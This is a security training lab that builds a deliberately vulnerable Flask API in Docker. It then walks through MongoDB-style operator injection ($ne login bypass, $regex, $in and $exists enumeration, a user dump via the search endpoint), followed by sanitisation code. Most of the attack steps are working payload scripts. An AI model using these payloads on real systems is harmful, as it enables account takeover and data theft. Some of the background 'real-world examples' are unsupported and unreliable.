# Lab 12: NoSQL Injection

## Objective

Exploit MongoDB-style operator injection against a live API from Kali Linux:

1. **`$ne` (not-equal) bypass** — bypass login by sending `{"password": {"$ne": "x"}}` — any user whose password is not "x" matches
2. **`$regex` enumeration** — use regex operators to enumerate usernames character by character
3. **`$exists` and `$in` operators** — extract users by field existence and value membership
4. **Search endpoint operator injection** — dump the entire user collection via the search endpoint

---

## Background

NoSQL databases like MongoDB use JSON-based queries that support operator objects (`$ne`, `$gt`, `$regex`). When user input is merged directly into query objects, an attacker can inject operators to manipulate query logic — the NoSQL equivalent of SQL injection.

**Real-world examples:**
- **2021 — Multiple Node.js APIs** — MongoDB apps using `User.findOne({username: req.body.username, password: req.body.password})` are vulnerable when Express.js parses `?username[$ne]=x` into `{username: {$ne: 'x'}}`.
- **2019 npm `mongoose-express`** — popular middleware didn't sanitise operator objects; millions of packages affected.
- **Ruby on Rails + MongoDB** — `params` hash allows nested objects; `{"password": {"$gt": ""}}` matches all documents where password is greater than empty string (i.e., any non-empty password).
- **GraphQL + MongoDB** — GraphQL variables passed directly to MongoDB find(); attacker injects operators in the variable object.

**OWASP:** A03:2021 Injection

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv12                        │
│  ┌──────────────────────┐  {"password": {"$ne": "x"}}             │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3 / curl    │  ◀──────── admin token returned ─────────  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask + Python dict (MongoDB sim)  │  │
│                             │  POST /api/login (operator inject)  │  │
│                             │  POST /api/search (query inject)    │  │
│                             │  GET  /api/products (param inject)  │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv12

cat > /tmp/victim_adv12.py << 'PYEOF'
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

USERS = {
    'alice': {'_id':1,'username':'alice','password':'alice123','role':'user','email':'alice@innoz.com'},
    'admin': {'_id':2,'username':'admin','password':'s3cr3t_admin','role':'admin','email':'admin@innoz.com'},
    'bob':   {'_id':3,'username':'bob',  'password':'bob456',     'role':'user','email':'bob@innoz.com'},
}
PRODUCTS = [
    {'_id':1,'name':'Surface Pro 12','price':864,'category':'laptop'},
    {'_id':2,'name':'Surface Pen',   'price':49, 'category':'accessory'},
    {'_id':3,'name':'AirPods Pro',   'price':249,'category':'audio'},
]

def mongo_match(doc, query):
    for field, condition in query.items():
        val = doc.get(field)
        if isinstance(condition, dict):
            for op, operand in condition.items():
                if op=='$ne'    and val==operand:                return False
                if op=='$gt'    and not(val is not None and val>operand):  return False
                if op=='$lt'    and not(val is not None and val<operand):  return False
                if op=='$gte'   and not(val is not None and val>=operand): return False
                if op=='$lte'   and not(val is not None and val<=operand): return False
                if op=='$in'    and val not in operand:          return False
                if op=='$nin'   and val in operand:              return False
                if op=='$exists' and bool(operand)!=(val is not None): return False
                if op=='$regex' and not re.search(operand,str(val or '')): return False
        else:
            if val!=condition: return False
    return True

@app.route('/api/login', methods=['POST'])
def login():
    d = request.get_json() or {}
    q = {}
    if d.get('username') is not None: q['username'] = d['username']
    if d.get('password') is not None: q['password'] = d['password']
    for u in USERS.values():
        if mongo_match(u, q):
            return jsonify({'token':f'tok_{u["username"]}','role':u['role'],
                            'user':{k:v for k,v in u.items() if k!='password'}})
    return jsonify({'error':'Invalid credentials'}),401

@app.route('/api/products')
def products():
    q={}
    cat=request.args.get('category')
    mp=request.args.get('maxPrice')
    if cat: q['category']=cat
    if mp:
        try: q['price']={'$lte':float(mp)}
        except: pass
    return jsonify([p for p in PRODUCTS if mongo_match(p,q)])

@app.route('/api/search', methods=['POST'])
def search():
    d = request.get_json() or {}
    query = d.get('query',{})
    results=[u for u in USERS.values() if mongo_match(u,query)]
    return jsonify([{k:v for k,v in u.items() if k!='password'} for u in results])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv12 --network lab-adv12 \
  -v /tmp/victim_adv12.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv12.IPAddress}}' victim-adv12):5000/api/login"
```

---

### Step 2: Launch Kali

```bash
docker run --rm -it --name kali --network lab-adv12 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv12:5000"

python3 -c "
import urllib.request,json
req=urllib.request.Request('$T/api/login',data=json.dumps({'username':'alice','password':'alice123'}).encode(),headers={'Content-Type':'application/json'})
print('Normal login:', json.loads(urllib.request.urlopen(req).read()))
"
```

---

### Step 3: `$ne` Operator Injection — Login Bypass

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv12:5000"

def login(payload):
    req = urllib.request.Request(f"{T}/api/login",
        data=json.dumps(payload).encode(), headers={"Content-Type":"application/json"})
    try: return json.loads(urllib.request.urlopen(req).read())
    except Exception as e: return {"error": str(e)}

print("[*] NoSQL injection via MongoDB operator objects in JSON body:")
print()

# Normal login (rejected)
print("[1] Wrong password (rejected):")
r = login({"username": "admin", "password": "wrongpassword"})
print(f"    {r}")

# $ne bypass: password != "wrongpassword" → matches admin
print()
print("[2] $ne bypass: password: {$ne: 'x'} → matches ANY user whose password != 'x'")
r2 = login({"username": "admin", "password": {"$ne": "x"}})
print(f"    {r2}")

print()
print("[3] $ne on username too: get first matching user")
r3 = login({"username": {"$ne": "nonexistent"}, "password": {"$ne": "nonexistent"}})
print(f"    {r3}")

print()
print("[4] $regex: find users whose username matches pattern")
r4 = login({"username": {"$regex": "^adm"}, "password": {"$ne": "x"}})
print(f"    {r4}")

print()
print("[5] $in: match specific set of usernames")
r5 = login({"username": {"$in": ["admin", "root", "superuser"]}, "password": {"$ne": "x"}})
print(f"    {r5}")
EOF
```

**📸 Verified Output:**
```
[1] {"error": "Invalid credentials"}

[2] $ne bypass: {"role": "admin", "token": "tok_admin", "user": {"username": "admin", ...}}

[3] First matching user: {"role": "user", "token": "tok_alice", ...}

[4] $regex ^adm: {"role": "admin", "token": "tok_admin", ...}
```

---

### Step 4: Enumerate Users via `$regex`

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv12:5000"

def search(query):
    req = urllib.request.Request(f"{T}/api/search",
        data=json.dumps({"query": query}).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Enumerate usernames character by character via $regex:")
print()

# Dump all users
all_users = search({"username": {"$regex": ".*"}})
print(f"[1] $regex '.*' matches all users: {[u['username'] for u in all_users]}")

# Find users whose username starts with 'a'
starts_a = search({"username": {"$regex": "^a"}})
print(f"[2] username starts with 'a': {[u['username'] for u in starts_a]}")

# Find admin specifically
admin = search({"role": "admin"})
print(f"[3] role = 'admin': {admin}")

# $exists: find users with email field
has_email = search({"email": {"$exists": True}})
print(f"[4] email $exists: {len(has_email)} users have email field")

# $nin: exclude known users
not_alice = search({"username": {"$nin": ["alice", "bob"]}})
print(f"[5] username $nin [alice,bob]: {[u['username'] for u in not_alice]}")

print()
print("[!] In MongoDB, these operators work the same way:")
print("    db.users.find({password: {$ne: 'x'}}) → returns all users!")
EOF
```

---

### Step 5: Product Filter Injection

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv12:5000"

def get(path):
    return json.loads(urllib.request.urlopen(T+path).read())

print("[*] Parameter injection in product filter endpoint:")

# Normal price filter
r1 = get("/api/products?maxPrice=100")
print(f"[1] Normal maxPrice=100: {[p['name'] for p in r1]}")

# All products (no filter)
r2 = get("/api/products")
print(f"[2] No filter: {[p['name'] for p in r2]}")

# Category filter
r3 = get("/api/products?category=laptop")
print(f"[3] category=laptop: {[p['name'] for p in r3]}")

print()
print("[*] In a real MongoDB app, the attack would be:")
print("    GET /api/products?price[$gt]=0")
print("    Express.js parses this as: {price: {$gt: 0}} → all products!")
print("    Flask/Python doesn't auto-parse bracket params,")
print("    but JSON body injection on POST endpoints is equally effective.")
EOF
```

---

### Steps 6–8: Full Enumeration + Remediation + Cleanup

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv12:5000"

def search(q):
    req = urllib.request.Request(f"{T}/api/search", data=json.dumps({"query":q}).encode(),
        headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Complete user enumeration using operator combinations:")
print()

# By role
for role in ['user', 'admin', 'superadmin']:
    r = search({"role": role})
    if r: print(f"  role={role}: {[u['username'] for u in r]}")

# By email domain
r = search({"email": {"$regex": "@innoz\\.com$"}})
print(f"  email @innoz.com: {[u['username'] for u in r]}")

# All users sorted
all_u = search({"username": {"$exists": True}})
print(f"\n  All users ({len(all_u)} total):")
for u in all_u:
    print(f"    {u}")

print()
print("[*] Remediation: sanitise operator keys from user input")
print("""
    # UNSAFE: pass user JSON directly as query
    query = request.get_json()['query']
    results = collection.find(query)

    # SAFE: strip all keys starting with '$'
    def sanitise(obj):
        if isinstance(obj, dict):
            return {k: sanitise(v) for k, v in obj.items() if not k.startswith('$')}
        if isinstance(obj, list):
            return [sanitise(i) for i in obj]
        return obj

    safe_query = sanitise(user_query)
    results = collection.find(safe_query)
""")
EOF
exit
```

```bash
docker rm -f victim-adv12
docker network rm lab-adv12
```

---

## Further Reading
- [PortSwigger NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
